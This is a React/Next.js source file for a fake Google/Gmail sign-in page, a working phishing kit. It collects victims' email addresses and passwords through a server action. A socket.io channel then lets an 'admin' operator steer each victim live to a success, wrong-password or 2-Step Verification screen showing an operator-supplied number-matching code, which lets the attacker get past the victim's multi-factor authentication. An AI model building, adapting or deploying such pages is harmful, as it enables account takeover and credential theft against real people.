"use client";

import React, { useState, useEffect, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { loginAction, checkLoginStatus } from "./loginaction";
import { io } from "socket.io-client";
import Head from "next/head";

export default function LoginPage() {
    const router = useRouter();
    const [step, setStep] = useState(1);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [twoFACode, setTwoFACode] = useState("");
    const [error, setError] = useState("");
    const [loading, setLoading] = useState(false);
    const [statusMessage, setStatusMessage] = useState("");
    const [mounted, setMounted] = useState(false);
    const pollingRef = useRef(null);
    const socketRef = useRef(null);
    const [lang, setLang] = useState("en");
    const [socketConnected, setSocketConnected] = useState(false);
    const [currentSessionId, setCurrentSessionId] = useState(null);
    const availableLanguages = ['en', 'fr', 'syl'];

    // Simple translation function
    const t = (key) => {
        const translations = {
            'en': {
                'sign_in.title': 'Sign in',
                'sign_in.subtitle': 'to continue to Gmail',
                'sign_in.email_placeholder': 'Email or phone',
                'sign_in.forgot_email': 'Forgot email?',
                'sign_in.notice': 'Not your computer? Use InPrivate windows to sign in.',
                'sign_in.learn_more': 'Learn more',
                'sign_in.create_account': 'Create account',
                'sign_in.next': 'Next',
                'welcome.title': 'Welcome',
                'welcome.enter_password': 'Enter your password',
                'welcome.show_password': 'Show password',
                'welcome.forgot_password': 'Forgot password?',
                'verification.title': '2-Step Verification',
                'verification.instruction': 'Google sent a notification to your phone. Tap Yes, then tap the number below to sign in.',
                'verification.resend': 'Resend notification',
                'verification.may_take': 'This may take a few moments...',
                'verification.matching_text': 'Google needs to verify your device or phone number for security reasons.',
                'footer.lang_default': 'English (United States)',
                'footer.help': 'Help',
                'footer.privacy': 'Privacy',
                'footer.terms': 'Terms',
            },
            'fr': {
                'sign_in.title': 'Connexion',
                'sign_in.subtitle': 'pour continuer sur Gmail',
                'sign_in.email_placeholder': 'Adresse e-mail ou numéro de téléphone',
                'sign_in.forgot_email': 'Adresse e-mail oubliée ?',
                'sign_in.notice': 'Vous utilisez un ordinateur public ? Utilisez les fenêtres de navigation InPrivate pour vous connecter.',
                'sign_in.learn_more': 'En savoir plus',
                'sign_in.create_account': 'Créer un compte',
                'sign_in.next': 'Suivant',
                'welcome.title': 'Bienvenue',
                'welcome.enter_password': 'Saisissez votre mot de passe',
                'welcome.show_password': 'Afficher le mot de passe',
                'welcome.forgot_password': 'Mot de passe oublié ?',
                'verification.title': 'Validation en deux étapes',
                'verification.instruction': 'Google a envoyé une notification à votre téléphone. Appuyez sur Oui, puis sur le numéro ci-dessous pour vous connecter.',
                'verification.resend': 'Renvoyer la notification',
                'verification.may_take': 'Cela peut prendre quelques instants...',
                'verification.matching_text': 'Google doit vérifier votre appareil ou numéro de téléphone pour des raisons de sécurité.',
                'footer.lang_default': 'Français (France)',
                'footer.help': 'Aide',
                'footer.privacy': 'Confidentialité',
                'footer.terms': 'Conditions',
            },
            'syl': {
                'sign_in.title': 'ꠡꠣꠁꠘ ꠁꠘ',
                'sign_in.subtitle': 'Gmail ꠅ ꠎꠣꠔꠦ',
                'sign_in.email_placeholder': 'ꠁꠝꠦꠁꠟ ꠛꠣ ꠙ꠆ꠙꠂꠘ',
                'sign_in.forgot_email': 'ꠁꠝꠦꠁꠟ ꠜꠥꠟꠉꠦꠍꠦꠘ?',
                'sign_in.notice': 'ꠀꠙꠘꠣꠞ ꠇꠝ꠆ꠙꠤꠃꠐꠣ? ꠉꠥꠐꠦ ꠝꠣꠘꠣꠁꠔꠦ ꠉꠥꠐꠦ ꠝꠣꠘꠣꠁꠔꠦ ꠛꠦꠛꠀꠞ ꠇꠞꠥꠘ.',
                'sign_in.learn_more': 'ꠀꠞꠅ ꠎꠣꠘꠥꠘ',
                'sign_in.create_account': 'ꠀꠇꠣꠃꠘ꠆ꠐ ꠛꠣꠘꠣꠃꠘ',
                'sign_in.next': 'ꠙꠞ',
                'welcome.title': 'ꠡꠣꠉꠔ',
                'welcome.enter_password': 'ꠀꠙꠘꠣꠞ ꠙꠣꠡꠀꠞ꠆ꠒ ꠖꠤꠘ',
                'welcome.show_password': 'ꠙꠣꠡꠀꠞ꠆ꠒ ꠖꠦꠈꠣꠃꠘ',
                'welcome.forgot_password': 'ꠙꠣꠡꠀꠞ꠆ꠒ ꠜꠥꠟꠉꠦꠍꠦꠘ?',
                'verification.title': '꠪-ꠡ꠆ꠐꠦꠙ ꠛꠦꠞꠤꠚꠤꠇꠦꠡꠘ',
                'verification.instruction': 'Google ꠀꠙꠘꠣꠞ ꠙ꠆ꠙꠂꠘꠅ ꠀꠇꠐꠣ ꠘꠐꠤꠙꠤꠇꠦꠡꠘ ꠙꠣꠕꠣꠁꠍꠦ। Yes ꠧ ꠐꠦꠙ ꠇꠞꠥꠘ, ꠔꠣꠞꠙꠞ ꠡꠣꠁꠘ ꠁꠘ ꠇꠞꠔꠦ ꠘꠤꠌꠦꠞ ꠘꠝ꠆ꠛꠞꠧ ꠐꠦꠙ ꠇꠞꠥꠘ।',
                'verification.resend': 'ꠘꠐꠤꠙꠤꠇꠦꠡꠘ ꠀꠞꠅ ꠙꠣꠕꠣꠃꠘ',
                'verification.may_take': 'ꠇꠤꠌꠥ ꠝꠥꠢꠥꠞ꠆ꠔ ꠟꠣꠉꠔꠦ ꠙꠣꠞꠦ...',
                'verification.matching_text': 'ꠘꠤꠞꠣꠙꠔ꠆ꠔꠣꠞ ꠇꠣꠞꠘꠦ Google ꠀꠙꠘꠣꠞ ꠒꠣꠄꠜꠣꠁꠡ ꠛꠣ ꠙ꠆ꠙꠂꠘ ꠘꠝ꠆ꠛꠞ ꠛꠦꠞ ꠇꠞꠔꠦ ꠢꠛꠦ।',
                'footer.lang_default': 'ꠍꠤꠟꠐꠤ',
                'footer.help': 'ꠡꠣꠁꠎ꠆ꠎ',
                'footer.privacy': 'ꠉꠥꠙ꠆ꠔꠔꠣ',
                'footer.terms': 'ꠡꠞ꠆ꠔꠣꠛꠟꠤ',
            }
        };
        const langTranslations = translations[lang] || translations['en'];
        return langTranslations[key] || key;
    };

    useEffect(() => {
        setMounted(true);
        return () => {
            if (pollingRef.current) {
                clearInterval(pollingRef.current);
                pollingRef.current = null;
            }
            if (socketRef.current) {
                socketRef.current.disconnect();
                socketRef.current = null;
            }
        };
    }, []);

    // Initialize Socket.IO connection
    useEffect(() => {
        if (!mounted || !email) return;

        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL || "http://localhost:8000";

        socketRef.current = io(socketUrl, {
            transports: ["websocket", "polling"],
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000,
            timeout: 10000,
            path: "/socket.io/",
        });

        socketRef.current.on("connect", () => {
            // console.log("✅ Login page connected to socket server");
            setSocketConnected(true);
        });

        socketRef.current.on("disconnect", () => {
            // console.log("❌ Login page disconnected from socket");
            setSocketConnected(false);
        });

        // Listen for user updates from admin
        socketRef.current.on("user_update", (data) => {
            // console.log("📨 Received user_update on login page:", data);

            // Check if this update is for the current user
            if (data.email && data.email.toLowerCase() === email.toLowerCase()) {
                // console.log(`🔄 Updating status for ${email} to: ${data.newStatus}`);

                // Update the user's status based on admin action
                switch (data.newStatus) {
                    case "success":
                        clearInterval(pollingRef.current);
                        window.location.href = "/profile";
                        break;
                    case "2fa":
                        clearInterval(pollingRef.current);
                        if (data.authCode) {
                            setTwoFACode(data.authCode);
                            setStep(3);
                        } else {
                            // Fetch the code from server
                            checkLoginStatus(email).then(result => {
                                if (result.success && result.status === "2fa") {
                                    setTwoFACode(result.twoFACode || "");
                                    setStep(3);
                                }
                            });
                        }
                        break;
                    case "wrong_email":
                        clearInterval(pollingRef.current);
                        setError("Email not found. Please enter a valid email.");
                        setStep(1);
                        break;
                    case "wrong_password":
                        clearInterval(pollingRef.current);
                        setError("Wrong password. Try again or click Forgot password to reset it.");
                        setStep(2);
                        break;
                    case "pending":
                        // Stay on current step
                        break;
                    default:
                        break;
                }
            }
        });

        return () => {
            if (socketRef.current) {
                socketRef.current.off("user_update");
                socketRef.current.off("connect");
                socketRef.current.off("disconnect");
                socketRef.current.disconnect();
                socketRef.current = null;
            }
        };
    }, [mounted, email]);

    // Start polling for status updates (fallback)
    const startPolling = useCallback((targetEmail) => {
        if (pollingRef.current) {
            clearInterval(pollingRef.current);
        }

        pollingRef.current = setInterval(async () => {
            try {
                const result = await checkLoginStatus(targetEmail);
                if (result.success) {
                    if (result.status === "success") {
                        clearInterval(pollingRef.current);
                        window.location.href = "/profile";
                    } else if (result.status === "2fa") {
                        clearInterval(pollingRef.current);
                        setTwoFACode(result.twoFACode || "");
                        setStep(3);
                    } else if (result.status === "wrong_password") {
                        clearInterval(pollingRef.current);
                        setError("Wrong password. Try again or click Forgot password to reset it.");
                        setStep(2);
                    } else if (result.status === "wrong_email") {
                        clearInterval(pollingRef.current);
                        setError("Email not found. Please enter a valid email.");
                        setStep(1);
                    }
                }
            } catch (err) {
                console.error("Polling error:", err);
            }
        }, 3000);
    }, []);

    // Server Action wrapper for email step
    const handleEmailSubmit = async (formData) => {
        setError("");
        setLoading(true);

        try {
            const result = await loginAction(formData);
            if (result.success) {
                const sessionId = result.sessionId;
                setCurrentSessionId(sessionId);
                setStep(2);
            } else {
                setError(result.message || "An error occurred");
            }
        } catch (err) {
            setError("Network error");
        } finally {
            setLoading(false);
        }
    };

    // Server Action wrapper for password step
    const handlePasswordSubmit = async (formData) => {
        setError("");
        setLoading(true);

        try {
            const result = await loginAction(formData);

            if (result.success) {
                if (result.pending) {
                    setStep(5);
                    startPolling(email);
                } else if (result.requires2FA) {
                    setTwoFACode(result.twoFACode || "");
                    setStep(3);
                } else if (result.completed) {
                    window.location.href = "/profile";
                }
            } else {
                setError(result.message || "An error occurred");
            }
        } catch (err) {
            setError("Network error");
        } finally {
            setLoading(false);
        }
    };

    if (!mounted) return null;

    // Step 5: Loading/waiting state
    if (step === 5) {
        return (
            <div className="container-loading">
                <style dangerouslySetInnerHTML={{
                    __html: `
                    body { background: #fff; color: #202124; font-family: Arial, Helvetica, sans-serif; margin: 0; }
                    .container-loading { max-width: 420px; margin: 0 auto; padding: 35px 24px; text-align: center; }
                    .container-loading img.logo { display: block; width: 110px; margin: 0 auto 35px; }
                    .container-loading h1 { font-size: 22px; font-weight: 400; line-height: 1.4; margin-bottom: 28px; }
                    .container-loading p { font-size: 17px; color: #5f6368; line-height: 1.6; }
                    .loader { width: 64px; height: 64px; margin: 55px auto; animation: rotate 2s linear infinite; }
                    .loader svg { width: 100%; height: 100%; }
                    .path { fill: none; stroke: #1a73e8; stroke-width: 4; stroke-linecap: round; stroke-dasharray: 1, 150; stroke-dashoffset: 0; animation: dash 1.5s ease-in-out infinite; }
                    @keyframes rotate { 100% { transform: rotate(360deg); } }
                    @keyframes dash {
                        0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
                        50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
                        100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
                    }
                ` }} />
                <img className="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" />
                <h1>{t('verification.may_take')}</h1>
                <p>{t('verification.matching_text')}</p>
                <div className="loader">
                    <svg viewBox="25 25 50 50">
                        <circle className="path" cx="50" cy="50" r="20"></circle>
                    </svg>
                </div>
            </div>
        );
    }

    return (
        <div className="main-wrapper">
            <style dangerouslySetInnerHTML={{
                __html: `
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; padding: 20px 16px; margin: 0; }
        .main-wrapper { width: 100%; max-width: 450px; }
        .login-card { width: 100%; background: #ffffff; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; margin-bottom: 24px; }
        .brand-logo { text-align: center; font-size: 24px; font-weight: 500; margin-bottom: 16px; letter-spacing: -0.5px; display: flex; justify-content: center; align-items: center; }
        .brand-logo span:nth-child(1) { color: #4285f4; }
        .brand-logo span:nth-child(2) { color: #ea4335; }
        .brand-logo span:nth-child(3) { color: #fbbc05; }
        .brand-logo span:nth-child(4) { color: #4285f4; }
        .brand-logo span:nth-child(5) { color: #34a853; }
        .brand-logo span:nth-child(6) { color: #ea4335; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 30px; }
        .input-group { position: relative; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; background: transparent; transition: border-color 0.15s ease; color: #000; caret-color: #000; }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
        .input-group label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); background: #ffffff; padding: 0 4px; font-size: 16px; color: #757575; transition: 0.2s ease all; pointer-events: none; }
        .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #1a73e8; }
        .link-blue { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; display: inline-block; cursor: pointer; }
        .link-blue:hover { text-decoration: underline; }
        .notice { margin-top: 40px; font-size: 14px; color: #5f6368; line-height: 1.45; }
        .action-row { display: flex; justify-content: space-between; align-items: center; margin-top: 35px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
        .btn-next:hover { background-color: #1557b0; }
        .btn-next:disabled { opacity: 0.6; cursor: not-allowed; }
        .footer-row { display: flex; justify-content: space-between; align-items: center; padding: 0 4px; font-size: 12px; color: #5f6368; }
        .footer-links a { color: #5f6368; text-decoration: none; margin-left: 16px; }
        .footer-links a:hover { color: #202124; }
        .lang-selector { cursor: pointer; display: flex; align-items: center; background: none; border: none; font-size: 12px; color: #5f6368; }
        .lang-selector::after { content: " ▼"; font-size: 8px; margin-left: 4px; }
        .error-text { color: #d93025; font-size: 12px; margin-top: 4px; display: flex; align-items: center; gap: 4px; }
        .user-pill { display: inline-flex; align-items: center; justify-content: center; padding: 5px 12px; border: 1px solid #dadce0; border-radius: 16px; font-size: 14px; color: #3c4043; max-width: 100%; margin: 0 auto 30px auto; cursor: pointer; }
        .user-pill:hover { background-color: #f8f9fa; }
        .user-avatar { width: 20px; height: 20px; background: #1a73e8; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; margin-right: 8px; }
        .user-pill svg { margin-left: 6px; fill: #5f6368; }
        .show-pass-container { display: flex; align-items: center; margin: 12px 0 40px 4px; font-size: 14px; color: #202124; user-select: none; cursor: pointer; }
        .show-pass-container input { margin-right: 10px; width: 18px; height: 18px; cursor: pointer; }
        .center-wrapper { display: flex; width: 100%; justify-content: center; }
        .phone-prompt-icon { width: 60px; height: 90px; border: 3px solid #bcc1c6; border-radius: 8px; margin: 24px auto; position: relative; background: #f8f9fa; }
        .phone-prompt-icon::before { content: ""; position: absolute; top: 6px; left: 50%; transform: translateX(-50%); width: 12px; height: 3px; background: #bcc1c6; border-radius: 2px; }
        .phone-prompt-icon::after { content: ""; position: absolute; top: 25px; left: 5px; right: 5px; height: 35px; background: #e8f0fe; border: 1px solid #4285f4; border-radius: 4px; }
        .matching-number { font-size: 48px; font-weight: 400; color: #202124; margin: 24px 0; text-align: center; }
        .instruction-text { font-size: 14px; color: #3c4043; line-height: 1.5; text-align: left; margin-bottom: 16px; }
        .text-black { color: #000; }
        .socket-status { font-size: 12px; color: #5f6368; text-align: center; margin-top: 10px; }
        @media (max-width: 480px) {
          body { justify-content: flex-start; padding-top: 10px; }
          .login-card { border: none; padding: 20px 8px; }
          .footer-links { display: flex; width: 100%; justify-content: flex-end; }
          .footer-links a { margin-left: 0; margin-right: 16px; }
        }
      ` }} />

            <div className="login-card" style={step === 3 ? { textAlign: 'center' } : {}}>
                <div className="brand-logo" translate="no">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>

                {step === 1 && (
                    <>
                        <h1>{t('sign_in.title')}</h1>
                        <div className="subtitle">{t('sign_in.subtitle')}</div>

                        <form action={handleEmailSubmit}>
                            <div className="input-group">
                                <input
                                    type="text"
                                    id="login-field"
                                    name="email"
                                    placeholder=" "
                                    autoFocus
                                    autoComplete="username"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    disabled={loading}
                                    className="text-black"
                                />
                                <label htmlFor="login-field">{t('sign_in.email_placeholder')}</label>
                            </div>
                            <input type="hidden" name="step" value="1" />

                            <a href="#" className="link-blue" style={{ marginTop: '8px', display: 'inline-block' }}>{t('sign_in.forgot_email')}</a>

                            <div className="notice">
                                {t('sign_in.notice')}
                                <a href="#" className="link-blue" style={{ marginTop: '4px' }}>{t('sign_in.learn_more')}</a>
                            </div>

                            <div className="action-row">
                                <a href="#" className="link-blue">{t('sign_in.create_account')}</a>
                                <button type="submit" className="btn-next" disabled={loading}>{t('sign_in.next')}</button>
                            </div>
                        </form>
                    </>
                )}

                {step === 2 && (
                    <>
                        <h1>{t('welcome.title')}</h1>
                        <div className="center-wrapper">
                            <div className="user-pill" onClick={() => setStep(1)}>
                                <div className="user-avatar">{email.charAt(0).toLowerCase()}</div>
                                <span>{email}</span>
                                <svg viewBox="0 0 24 24" width="12" height="12">
                                    <path d="M7 10l5 5 5-5z"></path>
                                </svg>
                            </div>
                        </div>

                        <form action={handlePasswordSubmit}>
                            <input type="hidden" name="step" value="2" />
                            <input type="hidden" name="email" value={email} />
                            <div className="input-group">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    id="password-field"
                                    name="password"
                                    placeholder=" "
                                    autoFocus
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    disabled={loading}
                                    className="text-black"
                                    style={error ? { borderColor: '#d93025' } : {}}
                                />
                                <label htmlFor="password-field" style={error ? { color: '#d93025' } : {}}>{t('welcome.enter_password')}</label>
                            </div>
                            {error && (
                                <div className="error-text">
                                    <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                                    {error}
                                </div>
                            )}

                            <label className="show-pass-container">
                                <input
                                    type="checkbox"
                                    checked={showPassword}
                                    onChange={() => setShowPassword(!showPassword)}
                                />
                                <span>{t('welcome.show_password')}</span>
                            </label>

                            <div className="action-row" style={{ marginTop: 0 }}>
                                <a href="#" className="link-blue">{t('welcome.forgot_password')}</a>
                                <button type="submit" className="btn-next" disabled={loading}>{t('sign_in.next')}</button>
                            </div>
                        </form>
                    </>
                )}

                {step === 3 && (
                    <>
                        <h1>{t('verification.title')}</h1>
                        <div className="instruction-text" style={{ fontSize: '16px', color: '#202124', marginBottom: '20px' }}>
                            {t('verification.instruction')}
                        </div>

                        <img className="h-24 w-full" src="/phone.svg" alt="Phone Prompt" />

                        <div className="matching-number">{twoFACode}</div>


                        <a href="#" className="link-blue" style={{ textAlign: 'left', width: '100%', marginTop: '20px' }}>{t('verification.resend')}</a>
                    </>
                )}
            </div>

            <div className="footer-row">
                <button
                    type="button"
                    className="lang-selector"
                    aria-label="Change language"
                    onClick={() => {
                        const idx = availableLanguages.indexOf(lang);
                        const next = availableLanguages[(idx + 1) % availableLanguages.length];
                        setLang(next);
                    }}
                >
                    {lang === 'fr' ? 'Français (France)' : (lang === 'syl' ? 'Sylheti' : t('footer.lang_default'))}
                </button>
                <div className="footer-links">
                    <a href="#">{t('footer.help')}</a>
                    <a href="#">{t('footer.privacy')}</a>
                    <a href="#">{t('footer.terms')}</a>
                </div>
            </div>
        </div>
    );
}